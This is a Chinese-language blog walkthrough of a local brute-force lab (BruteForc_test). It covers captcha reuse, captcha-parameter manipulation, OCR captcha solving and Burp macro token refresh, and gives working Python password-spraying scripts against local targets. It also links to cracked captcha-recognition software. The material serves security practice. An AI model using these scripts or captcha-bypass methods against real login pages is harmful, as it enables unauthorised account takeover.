---
title: "BruteForce_test暴力破解练习"
categories: [ "安全技术","工具分享" ]
tags: [ "爆破","burpsuite","验证码" ]
draft: false
slug: "472"
date: "2020-02-02 13:07:00"
---

## 事情起因

`3sNwgeek`大佬工作上遇到的案例，[GitHub 地址][1]

这个大佬还有另外一个[`基于AWD比赛的蠕虫webshell`系列][2]也不错

有机会可以搞一下

## 配置环境

用类似`phpstudy`的环境就可以搭建

```
git clone https://github.com/3sNwgeek/BruteForc_test
```

然后打开`BruteForc_test/low.html`就可访问

![][3]

burp 设置可参考前几天写的[docker 搭建 pikachu 及 burp 暴力破解基于 Token 的表单][4]

## level-1_hint:签到题

使用的[字典][5]

![][6]

## level-2_hint:验证码复用

发送到`reapter`，尝试换个密码不换验证码：

![][7]

![][8]

发现不会报验证码的错误，也就是验证码可以重复使用，使用和上面一样的步骤

![][9]

## level-3_hint:验证码操纵

再次`reapter`看一下，发现对验证码使用的次数有限制了：

![][10]

![][11]

查看源码发现，除了前端代码，还有一个验证码文件

![][12]

并且验证码文件的参数是由前端传入的

![][13]

那我们测试下`Ccode`参数，发现特殊情况

当参数为`111`时，得出的验证码为`1`，`11`，`111`，`1111`四种情况中的一种

![][14]

![][15]

![][16]

同时，这里验证码输入错误后，并没有重置验证码，

只有在验证码输入正确，密码错误时，才会重置验证码。所以这里就存在了验证码可以被爆破的情况。

爆破脚本如下：

```
import requests

code_url = 'http://127.0.0.1/BruteForc_test/yzm2.php?Ccode=111'
login_url = 'http://127.0.0.1/BruteForc_test/LoginMid2.php'
passwd_list = open('./10-million-password-list-top-1000.txt',
                   'r').read().splitlines()
for passwd in passwd_list:
    r = requests.session()
    r.get(code_url)
    for i in range(0, 4):
        number_list = ['1', '11', '111', '1111']
        data = {
            'name': 'admin',
            'password': passwd,
            'yzm': number_list[i]
        }
        html = r.post(login_url, data=data)
        if '登陆成功' in html.text:
            print("attack success!password:{}".format(passwd))
            exit()
        else:
            break
```

![][17]

## level-4_hint:突破前端加密

正常测试，先弹一次窗显示输入的用户名和密码：

![][18]

再弹一次窗显示一串字符，抓包显示传送的只是这个`login_key`

![][19]

由于是前端加密，所以我们不能使用`burp`的`intruder`模块爆破

暂时找不到加密文件，先放一放

## level-5_hint:验证码\_OCR 识别

这里都不存在前面的问题，需要使用验证码识别工具识别验证码再一起`post`

### python 脚本

下载[官方安装包][20]，默认安装完，安装路径为:`C:\Program Files (x86)\Tesseract-OCR\tesseract.exe`

`pip`安装库：`pip install pytesseract`

而且验证码有识别失败的情况，每个密码都需要多次实验，直到出现“验证码错误“或者”登陆成功“

全代码如下：

```
import pytesseract
from PIL import Image
import requests
from io import BytesIO

pass_list = open('./10-million-password-list-top-1000.txt',
'r').read().splitlines()
url = 'http://192.168.1.11/BruteForc_test/LoginHigh.php'
for line in pass_list:
while True:
s = requests.session()
pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files (x86)/Tesseract-OCR/tesseract.exe'
response = s.get('http://192.168.1.11/BruteForc_test/yzm.php')
image = Image.open(BytesIO(response.content))
code = pytesseract.image_to_string(image)
data = {
'name': 'admin',
'password': line,
'yzm': code
}
html = s.post(url, data=data) # 进行爆破尝试
print('[[-]error]:{}'.format(line))
if '登陆成功' in html.text:
print('[[+]succeed] password:{}'.format(line))
exit()
if '验证码错误' not in html.text:
break
```

但是效率不高：

![][21]

### PKAV HTTP Fuzzer

这里我使用了一个老牌的软件[`PKAV HTTP Fuzzer`][22]

在变体设置处把`burp`拦截的数据包放进去

![][23]

并选中`password`的值添加标记，把验证码的值添加验证码标记

![][24]

在右边添加字典：

![][25]

切换到图片验证码识别选项卡，填写验证码地址：

```
http://192.168.1.11/BruteForc_test/yzm.php
```

自带的引擎不好用，内置的亦思验证码识别引擎和次时代验证码识别引擎都能用

![][26]

但是只能加载图像，并不能识别，需要自行制作识别库且这两个软件都是收费的

亦思的破解版没有找到真的能用的，次时代的找到[一个][27]，解压密码为`xiazai.94fb.cn`

具体操作太复杂，可以看着[视频][28]学

最后导出一个识别库的`.cds`文件，加载后就可以识别验证码：

![][29]

识别库就不放出来了，尝试去做一下库还是蛮好玩的，想要的也可以[`tg`][30]联系我

切换到发包器选项卡，点击启动即可开始破解：

![][31]

### burp 插件

`burpsuite`的插件[`reCAPTCHA`][32]在这里也用不到

可以尝试插件[`captcha-killer`][33]，但这个插件本身并没有识别的功能，需要外部调用接口

[官方文档][34]

## level-6_hint:滑动验证码识别

尝试`reapter`发包两次查看：

![][35]

![][36]

看可以看到`token`值未发生变化，但是返回值不一样，说明重点不是`token`而是检测`session`

### python 脚本

检测`session`的话对`python`来说很简单，因为`request`有`session()`方法就是用来保持会话的

查看源代码可以发现`token`值就放在页面源代码输入框的下面：

![][37]

使用`beautifulsoup`解析页面获取到`token`再发出去就行了

全代码如下：

```
import requests
from bs4 import BeautifulSoup

url = 'http://127.0.0.1/BruteForc_test/hdyzma/'
login_url = 'http://127.0.0.1/BruteForc_test/hdyzma/welcome.php'
pass_list = open('./10-million-password-list-top-1000.txt',
'r').read().splitlines()
for line in pass_list:
s = requests.session()
html = s.get(url)
soup = BeautifulSoup(html.text, 'html5lib')
tag = soup.find_all('input')
token = tag[2].get('value')
data = {
'name': 'admin',
'password': line,
'token': token
}
html = s.post(login_url, data=data)
if '登陆成功' in html.text:
print('[[+]succeed] password is:{}'.format(line))
exit()
```

![][38]

### burp

跟着靶场原作者`3sNwGeek`做一遍

在拉动验证码抓取到的其中一个包的`response`中有`token值`

![][39]

于是我们可以使用`burpsuite`的宏功能把登录页的`token`值抓出来填入登录请求

#### 创建 Macros

切换到`Project options`的`Sessions`选项卡，拉到最下面`Marcros`

![][40]

点击添加会弹窗，我们选择刚刚的`192.168.1.11`的唯一一个`get`包：

![][41]

点击 OK，修改`Macro`描述，点击旁边的`configure item`按钮：

![][42]

在下面的选项卡点击`Add`添加我们指定的`token`参数：

![][43]

用鼠标选中`token`值，`burp`会开始自动填写开始标记和结束标记，自己填写`Parameter name`为`token`即可

![][44]

如果你设置和这个有差别，建议你改成和这个一样，比如选中`token`值后

开始的正则表达式是`value ="`，建议你改成`"token" value ="`

#### Session Handling Rules

`Session Handling Rules`里面已经添加好了一条新规则

![][45]

点击编辑，自定义名字，将`Rule Actions`默认的一条删除添加一条`Run a macro`：

![][46]

添加我们刚刚设置的`macro`并将参数名设置为我们刚刚设置的`token`

![][47]

然后设置宏的影响范围，因为我们只需要暴力破解账号密码，

所以 Tools Scope 这里只选中 Repeater、Intruder 就行了，其它模块可根据实际需要勾选：

![][48]

#### 暴力破解

回到`Repeater`，点击`Go`重新发包，可以看到现在`token`参数会自动刷新：

![][49]

![][50]

使用 Intruder 暴力破解账号密码，模式选择为`Cluster bomb`(簇炸弹)

这个模式必须设置两个及以上`payload`，因此我们把`username`也设置 payload

![][51]

然后`payload sets`中第一个位置只添加一个`admin`，第二个`payload`依然为`top-1000`

![][52]

因为多线程会同时刷新 token，导致部分请求包拿到的 token 已经被刷新了，所以只能设置单线程跑

成功暴破得到账号`admin/123456a`

![][53]

参考文章：

- [暴力破解靶场][54]
- [使用 BurpSuite 宏获取 CSRF-TOKEN][55]
- [爆破带验证码的后台][56]

本文完。

[1]: https://github.com/3sNwgeek/BruteForc_test
[2]: https://github.com/3sNwgeek/awd_worm_phpwebshell_framework
[3]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_140653.png
[4]: https://soapffz.com/462.html#menu_index_5=true
[5]: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
[6]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_140829.png
[7]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_141009.png
[8]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_141026.png
[9]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_141108.png
[10]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_141410.png
[11]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_141421.png
[12]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_171924.png
[13]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_171914.png
[14]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_172453.png
[15]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_172515.png
[16]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_172535.png
[17]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_180859.png
[18]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_181301.png
[19]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200202_181617.png
[20]: https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-4.00.00dev.exe
[21]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_134932.png
[22]: https://www.lanzous.com/i1z2s3e
[23]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_151726.png
[24]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_151845.png
[25]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_152521.png
[26]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_152032.png
[27]: https://pan.baidu.com/s/1gxFdk?fid=943060932816851
[28]: https://pan.baidu.com/s/1jGJU2nO?fid=3392384981
[29]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_152305.png
[30]: https://t.me/soapffz
[31]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200203_152748.png
[32]: https://github.com/bit4woo/reCAPTCHA/releases/latest
[33]: https://github.com/c0ny1/captcha-killer
[34]: http://gv7.me/articles/2019/burp-captcha-killer-usage/
[35]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_105621.png
[36]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_105630.png
[37]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_110238.png
[38]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_110546.png
[39]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_111128.png
[40]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_111620.png
[41]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_111725.png
[42]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_112922.png
[43]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_111934.png
[44]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_160513.png
[45]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_113155.png
[46]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_113514.png
[47]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_113404.png
[48]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_160657.png
[49]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_160731.png
[50]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_160743.png
[51]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_160902.png
[52]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_162328.png
[53]: https://img.soapffz.com/archives_img/2020/02/02/archives_20200204_162405.png
[54]: http://www.7ten7.top/2019/09/18/2019-09-18-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%9D%B6%E5%9C%BA/
[55]: https://mp.weixin.qq.com/s/2qe1Sx3IV2LHwomMSTacdg
[56]: https://mp.weixin.qq.com/s/lKAp0A4qQuh0JP9qQnPvcg